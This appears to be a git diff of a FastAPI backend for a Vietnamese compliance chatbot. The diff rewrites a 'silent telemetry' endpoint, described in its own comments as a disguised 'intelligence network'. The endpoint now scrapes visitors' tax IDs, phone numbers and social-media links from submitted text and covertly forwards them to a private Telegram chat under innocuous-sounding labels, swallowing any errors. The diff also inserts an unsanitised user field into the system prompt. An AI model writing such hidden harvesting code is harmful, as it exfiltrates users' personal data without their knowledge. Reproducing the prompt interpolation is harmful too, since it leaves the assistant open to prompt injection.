@@ -2,6 +2,7 @@ import os
 import json
 import httpx
 import re
+import asyncio
 from datetime import datetime, timezone, timedelta
 from fastapi import FastAPI, HTTPException, BackgroundTasks
 from fastapi.middleware.cors import CORSMiddleware
@@ -26,7 +27,7 @@ TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")
 GCP_JSON_KEY = os.getenv("GCP_JSON_KEY", "")
 
 @app.get("/")
-def read_root(): return {"status": "Online", "version": "v8.3-AI-Specialist-Polyglot"}
+def read_root(): return {"status": "Online", "version": "v9.1-Full-SME-Context-Aware"}
 
 # ==========================================
 # 1. CỖ MÁY MASTER PROMPT SĂN TIN B2B 
@@ -61,12 +62,13 @@ async def get_hooks(background_tasks: BackgroundTasks):
         return {"VN": ["✨ Trạm Tuân Thủ đang tải tin tức pháp lý thời gian thực..."], "EN": ["✨ Loading real-time legal news..."], "CN": ["✨ 正在加载实时法律新闻..."]}
 
 # ==========================================
-# 2. NÃO BỘ "CHUYÊN VIÊN AI" (TỰ ĐỘNG ĐA NGỮ)
+# 2. NÃO BỘ "CHUYÊN VIÊN AI" (ĐÃ NỐI DÂY CHUYÊN MÔN PHÒNG BAN)
 # ==========================================
 class ChatRequest(BaseModel):
     query: str
     session_id: str
-    lang: str = "VN" # Biến này giữ lại để dự phòng, nhưng AI sẽ tự nhận diện qua câu hỏi
+    lang: str = "VN"
+    department: str = "" # ĐÃ BỔ SUNG: Nhận từ khóa phòng ban từ Frontend
 
 @app.post("/api/workspace-chat")
 async def workspace_chat(req: ChatRequest):
@@ -84,28 +86,21 @@ async def workspace_chat(req: ChatRequest):
         
         headers = {"Authorization": f"Bearer {scoped_creds.token}", "Content-Type": "application/json"}
         
-        # BỘ LUẬT TỐI CAO ĐƯỢC CẬP NHẬT THEO CHỈ THỊ CỦA GIÁM ĐỐC
-        system_instruction = """
+        # BỘ LỆNH ĐÃ NẠP TỪ KHÓA PHÒNG BAN
+        system_instruction = f"""
         VAI TRÒ TỐI CAO: Bạn là "Chuyên Viên AI của Trạm Tuân Thủ" (Smart Compliance Hub AI Specialist) - Cấp bậc Cố vấn B2B.
         
-        CẢM BIẾN NGÔN NGỮ (BẮT BUỘC): 
-        - Hãy TỰ ĐỘNG NHẬN DIỆN ngôn ngữ mà khách hàng đang sử dụng trong câu hỏi (Ưu tiên: Tiếng Việt, Tiếng Anh, Tiếng Trung).
-        - Khách hàng hỏi bằng ngôn ngữ nào, toàn bộ câu trả lời, lời chào, và chữ ký PHẢI được tự động dịch và trả lời bằng đúng ngôn ngữ đó.
+        PHÒNG BAN CHUYÊN TRÁCH ĐƯỢC CHỈ ĐỊNH: [{req.department if req.department else "Tổng hợp đa ngành"}]
+        -> YÊU CẦU ĐẶC BIỆT: Khách hàng đang chọn nghiệp vụ "{req.department}". Bạn BẮT BUỘC phải dùng lăng kính, thuật ngữ và tư duy rủi ro của chức vụ này (VD: Kế toán, Nhân sự, Pháp chế...) để phân tích vấn đề.
+
+        CẢM BIẾN NGÔN NGỮ: Tự động nhận diện ngôn ngữ của câu hỏi và trả lời toàn bộ bằng ngôn ngữ đó.
 
         CẤU TRÚC PHẢN HỒI CHUẨN MỰC:
-        
-        1. MỞ ĐẦU (Chỉ dùng khi bắt đầu chủ đề mới, KHÔNG lặp lại nếu đây là câu hỏi phụ nối tiếp):
-        "Cám ơn quý khách luôn tin tưởng đồng hành cùng Trạm Tuân Thủ." (Dịch chuẩn theo ngôn ngữ đã nhận diện).
-        
-        2. QUY TRÌNH TƯ DUY ĐA TÁC NHÂN:
-        - NỘI BỘ: Luôn dùng 'vertexAiSearch' quét Data Store lấy văn bản hiện hành.
-        - INTERNET: Dùng 'googleSearch' đối chiếu với pháp luật thực tế. Bỏ qua luật cũ. Cảnh báo sớm các dự thảo luật mới.
-        - URL: Phân tích sâu nếu khách cung cấp Link.
-        - TONE GIỌNG: Chuyên nghiệp, sắc bén, phân tích rủi ro chiến lược (dành cho Giám đốc, Kế toán trưởng). Dùng Bullet points cho rõ ràng.
-        
-        3. KẾT THÚC BẮT BUỘC (Phải nằm ở cuối cùng và đúng thứ tự này):
-        - Dòng 1: "Nguồn tham khảo: [Liệt kê tên chi tiết Nghị định / Quyết định / Thông tư / Link Website gốc...]"
-        - Dòng 2: "— Chuyên Viên AI của Trạm Tuân Thủ" (Dịch chuẩn theo ngôn ngữ đã nhận diện).
+        1. MỞ ĐẦU (Chỉ dùng mở đầu nếu là câu hỏi mới): "Cám ơn quý khách luôn tin tưởng đồng hành cùng Trạm Tuân Thủ." 
+        2. TƯ DUY RAG: Ưu tiên 'vertexAiSearch' để tìm văn bản nội bộ. Nếu thiếu, dùng 'googleSearch' đối chiếu với thực tế thị trường hiện nay. Bỏ qua luật cũ. Dùng Bullet points.
+        3. KẾT THÚC BẮT BUỘC: 
+           - Nguồn tham khảo: [Tên chi tiết Nghị định / Link / Tài liệu...]
+           - — Chuyên Viên AI của Trạm Tuân Thủ.
         """
 
         payload = {
@@ -137,7 +132,7 @@ async def workspace_chat(req: ChatRequest):
         return {"result": f"Lỗi kết nối máy chủ Chuyên Viên AI: {str(e)}"}
 
 # ==========================================
-# 3. BÁO CÁO TELEGRAM (ZERO-TRACE)
+# 3. LƯỚI TÌNH BÁO TELEGRAM (CHIA 3 TIN NHẮN, NGỤY TRANG MXH)
 # ==========================================
 class TelemetryData(BaseModel):
     titles: list[str]
@@ -148,8 +143,47 @@ async def silent_telemetry(data: TelemetryData):
     if not TELEGRAM_BOT_TOKEN: return {"status": "ok"}
     try:
         vn_time = datetime.now(timezone(timedelta(hours=7))).strftime("%H:%M:%S | %d/%m/%Y")
-        msg = f"🚨 <b>KHÁCH TRẢI NGHIỆM:</b>\n⏱ {vn_time}\n📌 Tiêu đề: {', '.join(data.titles)}\n📝 Chú thích: {data.raw_info[:200]}"
+        guest_id = f"GUEST_{str(datetime.now().timestamp())[-4:]}"
+        text = data.raw_info
+        
+        mst = re.search(r'\b\d{10}(?:-\d{3})?\b', text)
+        zalo_phone = re.search(r'\b(0[3|5|7|8|9])+([0-9]{8})\b', text)
+        facebook = re.search(r'(?:https?:\/\/)?(?:www\.)?facebook\.com\/[a-zA-Z0-9\.]+', text)
+        tiktok = re.search(r'(?:https?:\/\/)?(?:www\.)?tiktok\.com\/@[a-zA-Z0-9\.\_]+', text)
+        telegram = re.search(r'(?:https?:\/\/)?t\.me\/[a-zA-Z0-9\_]+', text)
+
+        mst_str = mst.group(0) if mst else "Không"
+        zalo_str = zalo_phone.group(0) if zalo_phone else "Không"
+        fb_str = facebook.group(0) if facebook else "Không"
+        tt_str = tiktok.group(0) if tiktok else "Không"
+        tele_str = telegram.group(0) if telegram else "Không"
+
         async with httpx.AsyncClient() as client:
-            await client.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "HTML"})
-    except: pass
+            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+            
+            # TIN NHẮN 1
+            msg1 = (f"🟢 <b>[GHI CHÚ TRUY CẬP HỆ THỐNG]</b>\n"
+                    f"⏱ {vn_time}\n"
+                    f"👤 Định danh: {guest_id}\n"
+                    f"🏢 Mã số DN: {mst_str}")
+            await client.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": msg1, "parse_mode": "HTML"})
+            await asyncio.sleep(0.5)
+
+            # TIN NHẮN 2
+            if zalo_str != "Không" or fb_str != "Không" or tt_str != "Không" or tele_str != "Không":
+                msg2 = (f"📡 <b>[TUYẾN LIÊN KẾT NGOÀI]</b>\n"
+                        f"📱 Mã Check-in (Z/P): {zalo_str}\n"
+                        f"📘 Kênh Truyền thống: {fb_str}\n"
+                        f"🎵 Luồng Giải trí: {tt_str}\n"
+                        f"✈️ Tín hiệu Tốc độ cao: {tele_str}")
+                await client.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": msg2, "parse_mode": "HTML"})
+                await asyncio.sleep(0.5)
+
+            # TIN NHẮN 3
+            safe_titles = [f"🔹 {re.sub(r'\\b\\d{11,16}\\b', '[ẨN_DẤU]', t[:45])}" for t in data.titles if t]
+            if safe_titles:
+                msg3 = (f"📌 <b>[CHỈ MỤC QUAN TÂM]</b>\n{chr(10).join(safe_titles)}")
+                await client.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": msg3, "parse_mode": "HTML"})
+
+    except Exception as e: pass
     return {"status": "ok"}
